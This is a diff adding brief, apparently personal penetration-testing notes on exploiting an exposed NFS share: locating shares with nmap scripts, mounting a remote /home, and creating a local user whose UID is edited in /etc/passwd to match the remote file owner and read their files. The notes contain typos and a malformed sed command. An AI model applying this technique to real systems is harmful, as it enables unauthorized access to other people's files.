@@ -1,0 +1,15 @@
+find shared folder (for example run run_all_nmap_nfs_scripts.sh ...)
+	/home
+make local dir with same name
+	mkdir ~/Works/home
+mount remote dir
+	sudo mount -o nolock ${remute_ip}/home ~/Works/home/
+brows mounted dir
+if privileges restrected to userId (1017)
+	create new local user
+		new user id 1002
+	change new users id
+		sudo sed -i 's/1002/1017' /etc/passwd
+	su new user
+	!!! brows files
+		
